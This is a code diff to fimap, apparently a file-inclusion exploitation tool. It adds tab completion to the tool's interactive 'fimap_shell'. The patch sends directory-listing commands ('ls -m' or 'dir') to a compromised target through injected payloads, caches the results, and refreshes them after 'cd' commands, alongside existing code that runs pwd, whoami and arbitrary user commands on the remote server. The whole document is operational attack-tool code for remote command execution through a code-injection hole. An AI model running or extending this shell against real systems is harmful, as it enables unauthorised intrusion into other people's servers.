@@ -180,14 +180,55 @@ class codeinjector(baseClass):
 
                 if (type(attack) == str):
                     if (attack == "fimap_shell"):
+                        
+                        
+                        tab_choice = []
+                        ls_cmd = None
+                        def complete(txt, state):
+                            for tab in tab_choice:
+                                if tab.startswith(txt):
+                                    if not state: return tab
+                                    else: state -= 1
+                        
+                        if (self.config["p_tabcomplete"]):
+                            self._log("Setting up tab-completation...", self.LOG_DEBUG)
+                            try:
+                                import readline
+                                readline.parse_and_bind("tab: complete")
+                                readline.set_completer(complete)
+                                if (isUnix):
+                                    ls_cmd = "ls -m"
+                                else:
+                                    ls_cmd = "dir"
+                            except:
+                                self._log("Failed to setup readline module!", self.LOG_WARN)
+                                self._log("Falling back to default exploit-shell.", self.LOG_WARN)
+                        
+                        
                         cmd = ""
                         print "Please wait - Setting up shell (one request)..."
                         #pwd_cmd = item.generatePayload("pwd;whoami")
-                        commands = (xml2config.getCurrentDirCode(isUnix), xml2config.getCurrentUserCode(isUnix))
+                        
+                        
+                         
+                        commands = [xml2config.getCurrentDirCode(isUnix), xml2config.getCurrentUserCode(isUnix)]
+                        if (ls_cmd != None):
+                            commands.append(ls_cmd)
+                            
                         pwd_cmd = item.generatePayload(xml2config.concatCommands(commands, isUnix))
                         tmp = self.__doHaxRequest(url, postdata, mode, pwd_cmd, langClass, suffix).strip()
                         curdir = tmp.split("\n")[0].strip()
                         curusr = tmp.split("\n")[1].strip()
+                        
+                        if (ls_cmd != None):
+                            dir_content = ",".join(tmp.split("\n")[2:])
+                            tab_choice = []
+                            for c in dir_content.split(","):
+                                c = c.strip()
+                                if (c != ""):
+                                    tab_choice.append(c)
+                            
+                        
                         
                         if (curusr) == "":
                             curusr = "fimap"
@@ -205,10 +246,27 @@ class codeinjector(baseClass):
                                     userload = item.generatePayload(cmds)
                                     code = self.__doHaxRequest(url, postdata, mode, userload, langClass, suffix)
                                     if (cmd.startswith("cd ")):
+                                        # Get Current Directory...
                                         commands = (xml2config.generateChangeDirectoryCommand(curdir, isUnix), cmd, xml2config.getCurrentDirCode(isUnix))
                                         cmds = xml2config.concatCommands(commands, isUnix)
                                         cmd = item.generatePayload(cmds)
                                         curdir = self.__doHaxRequest(url, postdata, mode, cmd, langClass, suffix).strip()
+                                        
+                                        # Refresh Tab-Complete Cache...
+                                        if (ls_cmd != None):
+                                            self._log("Refreshing Tab-Completation cache...", self.LOG_DEBUG)
+                                            commands = (xml2config.generateChangeDirectoryCommand(curdir, isUnix), ls_cmd)
+                                            cmds = xml2config.concatCommands(commands, isUnix)
+                                            cmd = item.generatePayload(cmds)
+                                            tab_cache = self.__doHaxRequest(url, postdata, mode, cmd, langClass, suffix).strip()
+                                            if (ls_cmd != None):
+                                                dir_content = ",".join(tab_cache.split("\n"))
+                                                tab_choice = []
+                                                for c in dir_content.split(","):
+                                                    c = c.strip()
+                                                    if (c != ""):
+                                                        tab_choice.append(c)
+                                            
                                     print code.strip()
                             except KeyboardInterrupt:
                                 print "\nCancelled by user."
